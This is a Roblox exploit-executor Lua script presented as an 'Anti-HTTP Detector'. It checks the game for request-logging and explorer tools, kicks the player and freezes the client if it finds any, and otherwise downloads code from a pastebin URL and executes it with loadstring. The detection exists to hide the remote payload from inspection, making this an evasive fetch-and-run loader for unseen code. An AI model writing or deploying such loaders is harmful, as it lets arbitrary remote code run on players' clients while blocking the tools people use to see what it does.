-- Anti-HTTP Detector with URL Loader
local p = game:GetService("Players").LocalPlayer
local hs = game:GetService("HttpService")

if getgenv().__detector_triggered then print("Security Already Initialized") return end
getgenv().__detector_triggered = true
print("Security Initialized")

-- URL to execute after security checks pass
local TARGET_URL = "https://pastebin.qzz.io/raw/test"

local keys = {"httpspy","requestlogger","networkspy","spyui","requestviewer","packetlogger","SimpleSpy","remotespy","httpsniffer","trafficlog","dex","explorer","hydroxide"}

local function match(s)
    if not s then return false end
    s = string.lower(s)
    for _, k in ipairs(keys) do
        if string.find(s, k) then return true end
    end
    return false
end

local function scanGui()
    local success, result = pcall(function()
        for _, o in ipairs(game.CoreGui:GetDescendants()) do
            local c = o.ClassName
            if (c == "ScreenGui" or c == "TextLabel" or c == "Frame" or c == "TextBox" or c == "ScrollingFrame") and match(o.Name) then
                return true
            end
            if c == "TextLabel" or c == "TextBox" then
                if match(o.Text) then return true end
            end
        end
        return false
    end)
    return success and result
end

local lastApiCheck = 0
local function scanAPI()
    if tick() - lastApiCheck < 1.5 then return false end
    lastApiCheck = tick()
    local success, result = pcall(function()
        for _, k in ipairs(keys) do
            if getgenv()[k] or _G[k] or shared[k] then return true end
            local s, r = pcall(function()
                if loadstring then return loadstring("return " .. k)() end
            end)
            if s and r ~= nil then return true end
        end
        return false
    end)
    return success and result
end

local function scanRemotes()
    local suspicious = 0
    pcall(function()
        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                if match(v.Name) then suspicious = suspicious + 1 end
            end
        end
    end)
    return suspicious > 0
end

local function executeURL()
    print("Security passed - Loading script...")
    local success, result = pcall(function()
        return hs:GetAsync(TARGET_URL, true)
    end)
    if success and result then
        local load_success, load_error = pcall(function()
            loadstring(result)()
        end)
        if load_success then
            print("Script loaded successfully")
        else
            warn("Script execution failed:", load_error)
        end
    else
        warn("Failed to fetch script:", result)
    end
end

task.spawn(function()
    local checksPassed = 0
    local maxChecks = 3
    
    while checksPassed < maxChecks do
        task.wait(0.4)
        if scanGui() or scanAPI() or scanRemotes() then
            print("Security breach detected")
            pcall(function()
                p:Kick("Security violation detected")
                task.wait(0.2)
                while true do end
            end)
            return
        end
        checksPassed = checksPassed + 1
    end
    
    -- All checks passed, execute the URL
    executeURL()
    
    -- Continue monitoring in background
    while task.wait(2) do
        if scanGui() or scanAPI() or scanRemotes() then
            warn("Post-execution security breach!")
            pcall(function()
                p:Kick("Security violation detected")
                task.wait(0.2)
                while true do end
            end)
            break
        end
    end
end)
